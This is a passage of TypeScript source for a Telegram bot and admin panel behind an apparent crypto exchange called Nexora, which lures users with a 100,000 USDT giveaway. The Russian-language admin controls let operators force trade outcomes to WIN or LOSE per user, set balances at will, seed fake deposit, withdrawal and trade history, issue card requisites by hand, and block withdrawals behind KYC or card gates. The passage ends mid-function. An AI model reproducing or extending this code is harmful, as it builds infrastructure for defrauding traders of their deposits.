import { Injectable, Logger, OnModuleDestroy, OnModuleInit } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { BinaryOutcomeMode, RequestStatus } from '@prisma/client';
import { existsSync, readFileSync } from 'fs';
import { join } from 'path';
import { PrismaService } from '../../prisma/prisma.service';
import { BinaryTradeService } from '../binary/binary-trade.service';
import { SupportService } from '../support/support.service';
import { TreasuryService } from '../treasury/treasury.service';
import { KycService } from '../kyc/kyc.service';
import { PlatformLimitsService } from './platform-limits.service';
import { TelegramAdminService } from './telegram-admin.service';

type TgUser = { id: number; username?: string; first_name?: string };
type TgMessage = {
  message_id: number;
  text?: string;
  chat: { id: number; type: string };
  from?: TgUser;
};
type TgCallback = {
  id: string;
  data?: string;
  from: TgUser;
  message?: TgMessage & { message_id: number; chat: { id: number } };
};
type TgUpdate = {
  update_id: number;
  message?: TgMessage;
  callback_query?: TgCallback;
};

type InlineBtn = { text: string; callback_data?: string; web_app?: { url: string } };

type AwaitMode =
  | { kind: 'support'; ticketId: string }
  | { kind: 'req_card'; depositId: string }
  | { kind: 'req_comment'; depositId: string; card: string }
  | { kind: 'wd_reject'; withdrawalId: string }
  | { kind: 'balance'; userId: string }
  | { kind: 'msg'; userId: string }
  | { kind: 'global_req'; }
  | { kind: 'payout' }
  | { kind: 'min_deposit' }
  | { kind: 'min_withdrawal' }
  | { kind: 'min_trade' }
  | { kind: 'kyc_reject'; submissionId: string }
  | { kind: 'adjust'; userId: string; currency: string }
  | { kind: 'admin_unlock' };

@Injectable()
export class TelegramBotService implements OnModuleInit, OnModuleDestroy {
  private readonly logger = new Logger(TelegramBotService.name);
  private offset = 0;
  private stopped = false;
  private loop?: Promise<void>;
  private awaitReply = new Map<number, AwaitMode>();

  constructor(
    private readonly config: ConfigService,
    private readonly prisma: PrismaService,
    private readonly treasury: TreasuryService,
    private readonly trades: BinaryTradeService,
    private readonly support: SupportService,
    private readonly limits: PlatformLimitsService,
    private readonly kyc: KycService,
    private readonly tgAdmin: TelegramAdminService,
  ) {}

  private token() {
    return (
      this.config.get<string>('TELEGRAM_BOT_TOKEN') ||
      process.env.TELEGRAM_BOT_TOKEN ||
      ''
    ).trim();
  }

  private webAppUrl() {
    const explicit =
      this.config.get<string>('TELEGRAM_WEBAPP_URL') || process.env.TELEGRAM_WEBAPP_URL || '';
    if (explicit.trim()) return explicit.trim().replace(/\/$/, '');
    const cors = this.config.get<string>('CORS_ORIGINS') || process.env.CORS_ORIGINS || '';
    const https = cors
      .split(',')
      .map((s) => s.trim())
      .find((s) => s.startsWith('https://'));
    return https?.replace(/\/$/, '') || '';
  }

  private async isAdmin(from?: TgUser, chatId?: number) {
    return this.tgAdmin.isAdminTelegramId(from?.id, chatId);
  }

  async onModuleInit() {
    const token = this.token();
    const url = this.webAppUrl();
    if (!token || !url) {
      this.logger.warn('Telegram bot poller skipped (no TELEGRAM_BOT_TOKEN or HTTPS webapp URL)');
      return;
    }
    try {
      await this.tgAdmin.refreshAdminChats();
      await this.api('setChatMenuButton', {
        menu_button: { type: 'web_app', text: 'Open App', web_app: { url } },
      });
      // Only /start visible in the slash menu for users
      await this.api('deleteMyCommands', {});
      await this.api('setMyCommands', {
        commands: [{ command: 'start', description: 'Join NEXORA Mega Drop' }],
      });
      await this.api('setMyDescription', {
        description:
          'Nexora — next-generation crypto exchange. Right now we are giving away 100,000 USDT among active users. Transparent rankings, instant withdrawals, and limitless trading. Become a part of the champions\' league!',
      });
      await this.api('setMyShortDescription', {
        description: 'Nexora crypto exchange · 100,000 USDT Mega Drop for active traders',
      });
      await this.api('deleteWebhook', { drop_pending_updates: false });
      this.logger.log(`Telegram bot ready · Mini App: ${url}`);
    } catch (e) {
      this.logger.warn(`Telegram bot setup: ${e}`);
    }
    this.loop = this.poll();
  }

  onModuleDestroy() {
    this.stopped = true;
  }

  private async api(method: string, body?: Record<string, unknown>) {
    const token = this.token();
    const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: body ? JSON.stringify(body) : undefined,
    });
    const json = (await res.json()) as { ok: boolean; description?: string; result?: unknown };
    if (!json.ok) throw new Error(json.description || method);
    return json.result;
  }

  private kb(rows: InlineBtn[][]) {
    return { inline_keyboard: rows };
  }

  private async send(chatId: number, text: string, rows?: InlineBtn[][]) {
    await this.api('sendMessage', {
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: rows ? this.kb(rows) : undefined,
    });
  }

  private megaDropBannerPath(): string | null {
    const candidates = [
      join(process.cwd(), 'assets', 'nexora-mega-drop.png'),
      join(__dirname, '..', '..', '..', 'assets', 'nexora-mega-drop.png'),
    ];
    return candidates.find((p) => existsSync(p)) ?? null;
  }

  private async sendPhoto(
    chatId: number,
    filePath: string,
    caption: string,
    rows?: InlineBtn[][],
  ) {
    const token = this.token();
    const buf = readFileSync(filePath);
    const form = new FormData();
    form.append('chat_id', String(chatId));
    form.append('caption', caption.slice(0, 1024));
    form.append('parse_mode', 'HTML');
    if (rows) form.append('reply_markup', JSON.stringify(this.kb(rows)));
    form.append('photo', new Blob([new Uint8Array(buf)], { type: 'image/png' }), 'nexora-mega-drop.png');
    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    const json = (await res.json()) as { ok: boolean; description?: string };
    if (!json.ok) throw new Error(json.description || 'sendPhoto');
  }

  private async edit(chatId: number, messageId: number, text: string, rows?: InlineBtn[][]) {
    try {
      await this.api('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: rows ? this.kb(rows) : undefined,
      });
    } catch {
      await this.send(chatId, text, rows);
    }
  }

  private async answerCb(id: string, text?: string) {
    try {
      await this.api('answerCallbackQuery', { callback_query_id: id, text, show_alert: !!text && text.length > 40 });
    } catch {
      /* ignore */
    }
  }

  private async resolveAdminUserId(tgUserId?: number): Promise<string> {
    if (tgUserId != null) {
      const me = await this.prisma.user.findFirst({
        where: { telegramId: String(tgUserId), role: 'ADMIN', status: 'ACTIVE' },
        select: { id: true },
      });
      if (me) return me.id;
    }
    const admin = await this.prisma.user.findFirst({
      where: { role: 'ADMIN', status: 'ACTIVE' },
      orderBy: { createdAt: 'asc' },
      select: { id: true },
    });
    if (!admin) throw new Error('В БД нет пользователя ADMIN');
    return admin.id;
  }

  private menuRows(): InlineBtn[][] {
    return [
      [
        { text: '📊 Дашборд', callback_data: 'adm:dash' },
        { text: '💰 Депозиты', callback_data: 'adm:deps' },
      ],
      [
        { text: '📤 Выводы', callback_data: 'adm:wds' },
        { text: '📈 Сделки', callback_data: 'adm:trades' },
      ],
      [
        { text: '👥 Юзеры', callback_data: 'adm:users' },
        { text: '💬 Поддержка', callback_data: 'adm:sup' },
      ],
      [
        { text: '⚙ Настройки', callback_data: 'adm:set' },
        { text: '🎲 Накрутить стату', callback_data: 'adm:seed' },
      ],
      [{ text: '🚀 Mini App', web_app: { url: this.webAppUrl() } }],
    ];
  }

  private async poll() {
    while (!this.stopped) {
      try {
        const updates = (await this.api('getUpdates', {
          offset: this.offset,
          timeout: 25,
          allowed_updates: ['message', 'callback_query'],
        })) as TgUpdate[];
        for (const u of updates) {
          this.offset = u.update_id + 1;
          await this.handle(u).catch((e) => this.logger.warn(`update: ${e}`));
        }
      } catch (e) {
        if (this.stopped) break;
        this.logger.warn(`getUpdates: ${e}`);
        await new Promise((r) => setTimeout(r, 2000));
      }
    }
  }

  private async handle(u: TgUpdate) {
    if (u.callback_query) {
      await this.onCallback(u.callback_query);
      return;
    }
    const msg = u.message;
    if (!msg?.chat) return;
    const chatId = msg.chat.id;
    const text = (msg.text || '').trim();
    if (!text) return;

    const pending = this.awaitReply.get(chatId);
    if (pending && !text.startsWith('/')) {
      if (pending.kind === 'admin_unlock') {
        await this.handleAdminUnlock(chatId, msg.from, text);
        return;
      }
      if (!(await this.isAdmin(msg.from, chatId))) {
        this.awaitReply.delete(chatId);
        return;
      }
      await this.handleAwait(chatId, pending, text, msg.from?.id);
      return;
    }

    if (!text.startsWith('/')) return;
    const cmd = text.split(/\s+/)[0].split('@')[0].toLowerCase();

    if (cmd === '/adminq') {
      this.awaitReply.set(chatId, { kind: 'admin_unlock' });
      await this.send(chatId, '🔐 Введите пароль для доступа к админке:');
      return;
    }

    if (cmd === '/admin' || cmd === '/panel') {
      if (!(await this.isAdmin(msg.from, chatId))) {
        await this.send(chatId, '⛔ Нет доступа. Отправьте /adminq и введите пароль.');
        return;
      }
      this.awaitReply.delete(chatId);
      await this.send(chatId, '🛠 <b>NEXORA Admin</b>\nПолная панель — кнопки ниже:', this.menuRows());
      return;
    }

    if (cmd === '/help') {
      // Hidden from slash menu — keep silent for admins only
      if (await this.isAdmin(msg.from, chatId)) {
        await this.send(chatId, '<b>NEXORA Admin</b>\n/admin — панель\n/adminq — выдать доступ');
      }
      return;
    }

    if (cmd === '/start' || cmd === '/app') {
      const url = this.webAppUrl();
      if (!url) return;
      const rows: InlineBtn[][] = [
        [{ text: '🏆 Join Mega Drop — Open App', web_app: { url } }],
      ];
      if (await this.isAdmin(msg.from, chatId)) {
        rows.push([{ text: '🛠 Admin panel', callback_data: 'adm:menu' }]);
      }
      const caption = [
        '🏆 <b>NEXORA MEGA DROP — 100,000 USDT PRIZE POOL!</b>',
        '',
        'Welcome to the Nexora ecosystem! We are launching the biggest giveaway of the season. The main prize fund of <b>100,000 USDT</b> is already waiting for its winners.',
        '',
        'The rules are simple: the more active your trading in our mini-app, the higher your chances to grab your share of the pie. The <b>Top-10</b> traders will split the prize pool, and the <b>Grand Winner</b> will take home <b>30,000 USDT</b> directly to their account!',
        '',
        '⏳ Registration for the event is now open. Don\'t miss your chance — hit the button below and join the race for 100 thousand dollars!',
      ].join('\n');
      const banner = this.megaDropBannerPath();
      try {
        if (banner) {
          await this.sendPhoto(chatId, banner, caption, rows);
        } else {
          await this.send(chatId, caption, rows);
        }
      } catch (e) {
        this.logger.warn(`start welcome photo: ${e}`);
        await this.send(chatId, caption, rows);
      }
    }
  }

  private async handleAdminUnlock(chatId: number, from: TgUser | undefined, text: string) {
    const password = this.tgAdmin.unlockPassword();
    if (text.trim() !== password) {
      this.awaitReply.delete(chatId);
      await this.send(chatId, '❌ Неверный пароль');
      return;
    }
    const tgId = from?.id ?? chatId;
    const result = await this.tgAdmin.grantTelegramAdmin(tgId);
    if (String(chatId) !== String(tgId)) {
      await this.tgAdmin.grantTelegramAdmin(chatId);
    }
    this.awaitReply.delete(chatId);
    const extra = result.promotedUser
      ? '\nРоль в приложении: <b>ADMIN</b> (перезайдите в Mini App).'
      : '\nВойдите в Mini App с этого Telegram — роль ADMIN применится к аккаунту.';
    await this.send(
      chatId,
      `✅ Доступ к админке выдан.\nTG id: <code>${result.telegramId}</code>${extra}\n\nКоманда: /admin`,
      this.menuRows(),
    );
  }

  private async handleAwait(chatId: number, pending: AwaitMode, text: string, tgUserId?: number) {
    if (pending.kind === 'admin_unlock') return;
    const adminId = await this.resolveAdminUserId(tgUserId);
    try {
      if (pending.kind === 'support') {
        await this.support.replyAdmin(adminId, pending.ticketId, text);
        this.awaitReply.delete(chatId);
        await this.send(chatId, '✅ Ответ отправлен', this.menuRows());
        return;
      }
      if (pending.kind === 'req_card') {
        const card = text.trim();
        if (card.length < 4) throw new Error('Укажите номер карты / реквизиты');
        this.awaitReply.set(chatId, { kind: 'req_comment', depositId: pending.depositId, card });
        await this.send(
          chatId,
          `Карта сохранена:\n<code>${card}</code>\n\n✍ Теперь отправьте <b>комментарий</b> (необязательно) или нажмите «Пропустить».`,
          [
            [{ text: '⏭ Пропустить комментарий', callback_data: `adm:reqskip:${pending.depositId}` }],
            [{ text: '« Отмена', callback_data: `adm:dd:${pending.depositId}` }],
          ],
        );
        return;
      }
      if (pending.kind === 'req_comment') {
        const comment = text.trim() || undefined;
        await this.treasury.assignRequisites(adminId, pending.depositId, pending.card, comment);
        this.awaitReply.delete(chatId);
        await this.send(chatId, '✅ Реквизиты выданы пользователю (таймер 15 мин)', [
          [{ text: '💰 К депозитам', callback_data: 'adm:deps' }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'wd_reject') {
        const reason = text.trim();
        if (reason.length < 3) throw new Error('Укажите причину отказа (мин. 3 символа)');
        await this.treasury.rejectWithdrawal(adminId, pending.withdrawalId, reason);
        this.awaitReply.delete(chatId);
        await this.send(chatId, `❌ Вывод отклонён.\nПричина: ${reason}`, [
          [{ text: '📤 Выводы', callback_data: 'adm:wds' }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'balance') {
        const amount = Number(text.replace(',', '.').replace(/\s/g, ''));
        if (!Number.isFinite(amount)) throw new Error('Число, например 150000');
        await this.trades.adminSetBalance(pending.userId, amount, adminId);
        this.awaitReply.delete(chatId);
        await this.send(chatId, `✅ Баланс установлен: ${amount}`, [
          [{ text: '👤 Юзер', callback_data: `adm:ud:${pending.userId}` }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'msg') {
        const result = await this.trades.adminMessageUser(pending.userId, text);
        this.awaitReply.delete(chatId);
        const tip = result.telegramSent
          ? '✅ Сообщение отправлено в приложение и в Telegram'
          : '✅ Сообщение в приложение. В Telegram не доставлено (нет telegramId или пользователь не писал боту)';
        await this.send(chatId, tip, [
          [{ text: '👤 Юзер', callback_data: `adm:ud:${pending.userId}` }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'global_req') {
        await this.trades.setDepositRequisites(text);
        this.awaitReply.delete(chatId);
        await this.send(chatId, '✅ Глобальные реквизиты обновлены', [
          [{ text: '⚙ Настройки', callback_data: 'adm:set' }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'payout') {
        const n = Number(text.replace(',', '.'));
        if (!Number.isFinite(n) || n < 1 || n > 3) throw new Error('Коэф. от 1 до 3, напр. 1.96');
        await this.trades.setPayoutCoef(n);
        this.awaitReply.delete(chatId);
        await this.send(chatId, `✅ Payout = ${n}`, [
          [{ text: '⚙ Настройки', callback_data: 'adm:set' }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'min_deposit' || pending.kind === 'min_withdrawal' || pending.kind === 'min_trade') {
        const n = Number(text.replace(',', '.').replace(/\s/g, ''));
        if (!Number.isFinite(n) || n < 0) throw new Error('Число ≥ 0, напр. 1000');
        if (pending.kind === 'min_deposit') await this.limits.setMinDeposit(n);
        if (pending.kind === 'min_withdrawal') await this.limits.setMinWithdrawal(n);
        if (pending.kind === 'min_trade') await this.limits.setMinTrade(n);
        const label =
          pending.kind === 'min_deposit'
            ? 'Мин. депозит'
            : pending.kind === 'min_withdrawal'
              ? 'Мин. вывод'
              : 'Мин. сделка';
        this.awaitReply.delete(chatId);
        await this.send(chatId, `✅ ${label} = ${n}`, [
          [{ text: '⚙ Настройки', callback_data: 'adm:set' }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'kyc_reject') {
        const reason = text.trim() || 'Документы отклонены';
        await this.kyc.reject(adminId, pending.submissionId, reason);
        this.awaitReply.delete(chatId);
        await this.send(chatId, `❌ KYC отклонён.\nПричина: ${reason}`, [
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
        return;
      }
      if (pending.kind === 'adjust') {
        const amount = Number(text.replace(',', '.').replace(/\s/g, ''));
        if (!Number.isFinite(amount) || amount === 0) throw new Error('Дельта, напр. 5000 или -2000');
        await this.treasury.adjustBalance(adminId, {
          userId: pending.userId,
          currency: pending.currency,
          amount,
          description: 'TG admin adjust',
        });
        this.awaitReply.delete(chatId);
        await this.send(chatId, `✅ Баланс изменён на ${amount > 0 ? '+' : ''}${amount} ${pending.currency}`, [
          [{ text: '👤 Юзер', callback_data: `adm:ud:${pending.userId}` }],
          [{ text: '« Меню', callback_data: 'adm:menu' }],
        ]);
      }
    } catch (e) {
      await this.send(chatId, `❌ ${e instanceof Error ? e.message : e}\nПовторите ввод или /admin`);
    }
  }

  private async onCallback(cb: TgCallback) {
    const data = cb.data || '';
    const chatId = cb.message?.chat.id;
    const messageId = cb.message?.message_id;
    if (chatId == null || messageId == null) {
      await this.answerCb(cb.id);
      return;
    }
    if (!data.startsWith('adm:')) {
      await this.answerCb(cb.id);
      return;
    }
    if (!(await this.isAdmin(cb.from, chatId))) {
      await this.answerCb(cb.id, 'Нет доступа');
      return;
    }
    await this.answerCb(cb.id);

    try {
      if (data === 'adm:menu' || data === 'adm:cancel') {
        this.awaitReply.delete(chatId);
        await this.edit(chatId, messageId, '🛠 <b>NEXORA Admin</b>', this.menuRows());
        return;
      }
      if (data === 'adm:dash') return void (await this.showDash(chatId, messageId));
      if (data === 'adm:deps') return void (await this.showDeposits(chatId, messageId));
      if (data === 'adm:wds') return void (await this.showWithdrawals(chatId, messageId));
      if (data === 'adm:trades') return void (await this.showTrades(chatId, messageId));
      if (data === 'adm:users') return void (await this.showUsers(chatId, messageId));
      if (data === 'adm:sup') return void (await this.showSupport(chatId, messageId));
      if (data === 'adm:set') return void (await this.showSettings(chatId, messageId));

      if (data === 'adm:seed') {
        const adminId = await this.resolveAdminUserId(cb.from.id);
        const r = await this.trades.adminSeedFakeHistory(adminId);
        await this.edit(
          chatId,
          messageId,
          `✅ Накрутка: деп ${r.deposits} · вывод ${r.withdrawals} · сделки ${r.trades} (${r.currency})`,
          [[{ text: '« Меню', callback_data: 'adm:menu' }]],
        );
        return;
      }

      if (data === 'adm:set:req') {
        this.awaitReply.set(chatId, { kind: 'global_req' });
        await this.edit(
          chatId,
          messageId,
          '✍ Пришлите <b>глобальные реквизиты</b> одним сообщением (карта/крипто).',
          [[{ text: '« Отмена', callback_data: 'adm:set' }]],
        );
        return;
      }
      if (data === 'adm:set:pay') {
        this.awaitReply.set(chatId, { kind: 'payout' });
        await this.edit(chatId, messageId, '✍ Коэффициент payout (напр. <code>1.96</code>):', [
          [{ text: '« Отмена', callback_data: 'adm:set' }],
        ]);
        return;
      }
      if (data === 'adm:set:mindep') {
        this.awaitReply.set(chatId, { kind: 'min_deposit' });
        await this.edit(chatId, messageId, '✍ Минимальный депозит (число):', [
          [{ text: '« Отмена', callback_data: 'adm:set' }],
        ]);
        return;
      }
      if (data === 'adm:set:minwd') {
        this.awaitReply.set(chatId, { kind: 'min_withdrawal' });
        await this.edit(chatId, messageId, '✍ Минимальный вывод (число):', [
          [{ text: '« Отмена', callback_data: 'adm:set' }],
        ]);
        return;
      }
      if (data === 'adm:set:mintr') {
        this.awaitReply.set(chatId, { kind: 'min_trade' });
        await this.edit(chatId, messageId, '✍ Минимальная сумма сделки / маржа (число):', [
          [{ text: '« Отмена', callback_data: 'adm:set' }],
        ]);
        return;
      }

      // Deposit detail
      if (data.startsWith('adm:dd:')) {
        const id = data.slice('adm:dd:'.length);
        return void (await this.showDeposit(chatId, messageId, id));
      }
      if (data.startsWith('adm:reqskip:')) {
        const depositId = data.slice('adm:reqskip:'.length);
        const pending = this.awaitReply.get(chatId);
        const adminId = await this.resolveAdminUserId(cb.from.id);
        if (pending?.kind === 'req_comment' && pending.depositId === depositId) {
          await this.treasury.assignRequisites(adminId, depositId, pending.card);
          this.awaitReply.delete(chatId);
          await this.edit(chatId, messageId, '✅ Реквизиты выданы (без комментария). Таймер 15 мин.', [
            [{ text: '💰 Депозиты', callback_data: 'adm:deps' }],
            [{ text: '« Меню', callback_data: 'adm:menu' }],
          ]);
        } else {
          await this.edit(chatId, messageId, '⚠ Сначала отправьте номер карты кнопкой «Выдать реквизиты».', [
            [{ text: '💳 Выдать реквизиты', callback_data: `adm:req:${depositId}` }],
            [{ text: '« Назад', callback_data: `adm:dd:${depositId}` }],
          ]);
        }
        return;
      }
      if (data.startsWith('adm:req:')) {
        const depositId = data.slice('adm:req:'.length);
        this.awaitReply.set(chatId, { kind: 'req_card', depositId });
        await this.edit(
          chatId,
          messageId,
          '💳 <b>Выдача реквизитов</b>\n\n1️⃣ Пришлите <b>номер карты</b> / реквизиты одним сообщением.',
          [[{ text: '« Отмена', callback_data: `adm:dd:${depositId}` }]],
        );
        return;
      }
      if (data.startsWith('adm:dep:')) {
        const [, , action, id] = data.split(':');
        const adminId = await this.resolveAdminUserId(cb.from.id);
        if (action === 'ok') await this.treasury.approveDeposit(adminId, id, 'TG admin');
        else await this.treasury.rejectDeposit(adminId, id, 'TG admin');
        await this.showDeposits(chatId, messageId, `${action === 'ok' ? '✅ Зачислено' : '❌ Отклонено'}`);
        return;
      }

      if (data.startsWith('adm:wd:')) {
        const [, , action, id] = data.split(':');
        const adminId = await this.resolveAdminUserId(cb.from.id);
        if (action === 'ok') {
          await this.treasury.approveWithdrawal(adminId, id, 'TG admin');
          await this.edit(chatId, messageId, '✅ Вывод одобрен', [
            [{ text: '📤 Выводы', callback_data: 'adm:wds' }],
            [{ text: '« Меню', callback_data: 'adm:menu' }],
          ]);
        } else {
          this.awaitReply.set(chatId, { kind: 'wd_reject', withdrawalId: id });
          await this.edit(
            chatId,
            messageId,
            '❌ <b>Отказ в выводе</b>\nПришлите <b>причину</b> одним сообщением — её увидит пользователь.',
            [[{ text: '« Отмена', callback_data: 'adm:wds' }]],
          );
        }
        return;
      }

      if (data.startsWith('adm:tr:')) {
        const [, , action, id] = data.split(':');
        await this.trades.adminForceSettle(id, action === 'win' ? 'WIN' : 'LOSE');
        await this.showTrades(chatId, messageId, `Сделка → ${action.toUpperCase()}`);
        return;
      }

      if (data.startsWith('adm:kyc:')) {
        const parts = data.split(':');
        const action = parts[2];
        const submissionId = parts.slice(3).join(':');
        const adminId = await this.resolveAdminUserId(cb.from.id);
        if (action === 'ok') {
          await this.kyc.approve(adminId, submissionId);
          await this.edit(chatId, messageId, '✅ KYC одобрен', [
            [{ text: '« Меню', callback_data: 'adm:menu' }],
          ]);
          return;
        }
        if (action === 'no') {
          this.awaitReply.set(chatId, { kind: 'kyc_reject', submissionId });
          await this.edit(chatId, messageId, '✍ Причина отклонения KYC:', [
            [{ text: '« Отмена', callback_data: 'adm:menu' }],
          ]);
          return;
        }
        return;
      }

      if (data.startsWith('adm:ud:')) {
        return void (await this.showUser(chatId, messageId, data.slice('adm:ud:'.length)));
      }

      if (data.startsWith('adm:u:')) {
        const parts = data.split(':');
        const action = parts[2];
        const userId = parts.slice(3).join(':');
        if (action === 'win') await this.trades.adminSetOutcome(userId, BinaryOutcomeMode.WIN);
        else if (action === 'lose') await this.trades.adminSetOutcome(userId, BinaryOutcomeMode.LOSE);
        else if (action === 'rnd') await this.trades.adminSetOutcome(userId, BinaryOutcomeMode.RANDOM);
        else if (action === 'lock') await this.trades.adminSetTradeLock(userId, true, false);
        else if (action === 'ulock') await this.trades.adminSetTradeLock(userId, false, false);
        else if (action === 'kyc') await this.trades.adminSetTradeLock(userId, true, true);
        else if (action === 'kycok') {
          const adminId = await this.resolveAdminUserId(cb.from.id);
          await this.kyc.grant(adminId, userId);
        } else if (action === 'wdon') await this.trades.adminSetWithdrawCardGate(userId, true);
        else if (action === 'wdoff') await this.trades.adminSetWithdrawCardGate(userId, false);
        else if (action === 'bal') {
          this.awaitReply.set(chatId, { kind: 'balance', userId });
          await this.edit(chatId, messageId, '✍ Новый баланс числом (абсолютное значение):', [
            [{ text: '« Отмена', callback_data: `adm:ud:${userId}` }],
          ]);
          return;
        } else if (action === 'msg') {
          this.awaitReply.set(chatId, { kind: 'msg', userId });
          await this.edit(chatId, messageId, '✍ Текст сообщения пользователю:', [
            [{ text: '« Отмена', callback_data: `adm:ud:${userId}` }],
          ]);
          return;
        } else if (action === 'adj') {
          const u = await this.prisma.user.findUnique({ where: { id: userId } });
          const currency = u?.tradingCurrency || 'RUB';
          this.awaitReply.set(chatId, { kind: 'adjust', userId, currency });
          await this.edit(
            chatId,
            messageId,
            `✍ Дельта баланса (${currency}), напр. <code>5000</code> или <code>-2000</code>:`,
            [[{ text: '« Отмена', callback_data: `adm:ud:${userId}` }]],
          );
          return;
        }
        await this.showUser(chatId, messageId, userId);
        return;
      }

      if (data.startsWith('adm:sd:')) {
        return void (await this.showTicket(chatId, messageId, data.slice('adm:sd:'.length)));
      }
      if (data.startsWith('adm:sr:')) {
        const ticketId = data.slice('adm:sr:'.length);
        this.awaitReply.set(chatId, { kind: 'support', ticketId });
        // Works from notify message or panel — ask for reply text
        try {
          await this.edit(chatId, messageId, '✍ Напишите ответ пользователю следующим сообщением:', [
            [{ text: '« Отмена', callback_data: 'adm:sup' }],
          ]);
        } catch {
          await this.send(chatId, '✍ Напишите ответ пользователю следующим сообщением:', [
            [{ text: '« Отмена', callback_data: 'adm:sup' }],
          ]);
        }
        return;
      }
    } catch (e) {
      const err = e instanceof Error ? e.message : String(e);
      await this.edit(chatId, messageId, `❌ ${err}`, [[{ text: '« Меню', callback_data: 'adm:menu' }]]);
    }
  }

  private async showDash(chatId: number, messageId: number) {
    const [stats, pendingDep, pendingWd, openTickets] = await Promise.all([
      this.trades.adminStats(),
      this.prisma.depositRequest.count({ where: { status: RequestStatus.PENDING } }),
      this.prisma.withdrawalRequest.count({ where: { status: RequestStatus.PENDING } }),
      this.prisma.supportTicket.count({ where: { status: 'OPEN' } }),
    ]);
    const text = [
      '📊 <b>Дашборд</b>',
      `Юзеры: <b>${stats.users}</b> · сделки ⏳ <b>${stats.openTrades}</b>`,
      `WIN/LOSE: ${stats.won}/${stats.lost} · объём ${stats.volume}`,
      `Депозиты ⏳ <b>${pendingDep}</b> · выводы ⏳ <b>${pendingWd}</b>`,
      `Тикеты: <b>${openTickets}</b>`,
    ].join('\n');
    await this.edit(chatId, messageId, text, [
      [
        { text: '💰 Депозиты', callback_data: 'adm:deps' },
        { text: '📤 Выводы', callback_data: 'adm:wds' },
      ],
      [{ text: '« Меню', callback_data: 'adm:menu' }],
    ]);
  }

  private async showDeposits(chatId: number, messageId: number, note?: string) {
    const list = await this.treasury.listDeposits(RequestStatus.PENDING);
    const top = list.slice(0, 10);
    const lines = [
      '💰 <b>Депозиты (ожидают)</b>',
      note || '',
      top.length ? 'Нажмите заявку → реквизиты / зачислить' : 'Пусто',
      ...top.map((d, i) => {
        const hasReq = d.requisites ? '💳' : '⏳';
        const proof = d.proofUrl ? '🧾' : '';
        return `${i + 1}. ${hasReq}${proof} <code>${d.user?.username ?? '?'}</code> · <b>${d.amount} ${d.currency}</b>`;
      }),
    ].filter(Boolean);
    const rows: InlineBtn[][] = top.map((d) => [
      {
        text: `${d.requisites ? '👁' : '💳'} ${d.amount} @${(d.user?.username ?? '?').slice(0, 12)}`,
        callback_data: `adm:dd:${d.id}`,
      },
    ]);
    rows.push([{ text: '🔄', callback_data: 'adm:deps' }, { text: '« Меню', callback_data: 'adm:menu' }]);
    await this.edit(chatId, messageId, lines.join('\n'), rows);
  }

  private async showDeposit(chatId: number, messageId: number, id: string) {
    const list = await this.treasury.listDeposits(RequestStatus.PENDING);
    const d = list.find((x) => x.id === id) || (await this.treasury.listDeposits()).find((x) => x.id === id);
    if (!d) {
      await this.edit(chatId, messageId, 'Заявка не найдена', [[{ text: '«', callback_data: 'adm:deps' }]]);
      return;
    }
    const text = [
      '💰 <b>Заявка на депозит</b>',
      `User: <code>${d.user?.username ?? '?'}</code>`,
      `Сумма: <b>${d.amount} ${d.currency}</b>`,
      `Статус: ${d.status} · ${d.stage ?? ''}`,
      `Метод: ${d.method ?? '—'}`,
      d.requisites ? `\nРеквизиты:\n<pre>${String(d.requisites).slice(0, 400)}</pre>` : '\n⚠ Реквизиты ещё не выданы',
      d.proofUrl ? `\nЧек: ${d.proofUrl}` : '',
      `\n<code>${d.id}</code>`,
    ]
      .filter(Boolean)
      .join('\n');
    await this.edit(chatId, messageId, text, [
      [{ text: '💳 Выдать реквизиты', callback_data: `adm:req:${d.id}` }],
      [
        { text: '✅ Зачислить', callback_data: `adm:dep:ok:${d.id}` },
        { text: '❌ Отклонить', callback_data: `adm:dep:no:${d.id}` },
      ],
      [{ text: '« К списку', callback_data: 'adm:deps' }],
    ]);
  }

  private async showWithdrawals(chatId: number, messageId: number, note?: string) {
    const list = await this.treasury.listWithdrawals(RequestStatus.PENDING);
    const top = list.slice(0, 8);
    const lines = [
      '📤 <b>Выводы</b>',
      note || '',
      top.length ? '' : 'Пусто',
      ...top.map((d, i) => {
        const amt = d.amount?.toString?.() ?? d.amount;
        return `${i + 1}. <code>${d.user?.username ?? '?'}</code> · <b>${amt} ${d.currency}</b>\n<pre>${String(d.destination).slice(0, 140)}</pre>`;
      }),
    ].filter(Boolean);
    const rows: InlineBtn[][] = top.flatMap((d) => [
      [
        { text: `✅ ${String(d.amount).slice(0, 12)}`, callback_data: `adm:wd:ok:${d.id}` },
        { text: '❌', callback_data: `adm:wd:no:${d.id}` },
      ],
    ]);
    rows.push([{ text: '🔄', callback_data: 'adm:wds' }, { text: '« Меню', callback_data: 'adm:menu' }]);
    await this.edit(chatId, messageId, lines.join('\n'), rows);
  }

  private async showTrades(chatId: number, messageId: number, note?: string) {
    const open = await this.trades.adminOpenTrades(10);
    const lines = [
      '📈 <b>Открытые сделки</b>',
      note || '',
      open.length ? '' : 'Нет открытых',
      ...open.map(
        (t, i) =>
          `${i + 1}. @${t.user?.username ?? '?'} · ${t.pairId} · ${t.direction} · ${t.stake}`,
      ),
    ].filter(Boolean);
    const rows: InlineBtn[][] = open.flatMap((t) => [
      [
